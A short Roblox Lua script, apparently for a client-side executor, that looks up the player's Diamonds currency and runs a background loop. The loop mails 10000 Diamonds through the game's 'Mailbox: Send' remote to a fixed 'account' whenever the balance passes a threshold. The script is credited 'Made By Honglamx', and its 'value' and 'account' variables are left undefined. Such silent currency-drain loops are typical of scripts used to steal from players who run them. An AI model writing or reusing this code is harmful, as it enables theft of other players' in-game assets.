

local iditem = nil
local save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
for i, v in pairs(save.Get().Inventory.Currency) do
    if v.id == "Diamonds" then
        iditem = i
    end
end
spawn(function()
    while wait() do
        if game:GetService("Players").LocalPlayer.leaderstats["\240\159\146\142 Diamonds"].Value >= value then
            local args = {
                [1] = account,
                [2] = "Made By Honglamx",
                [3] = "Currency",
                [4] = tostring(iditem),
                [5] = 10000
            }
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                unpack(args))
        end
    end
end)
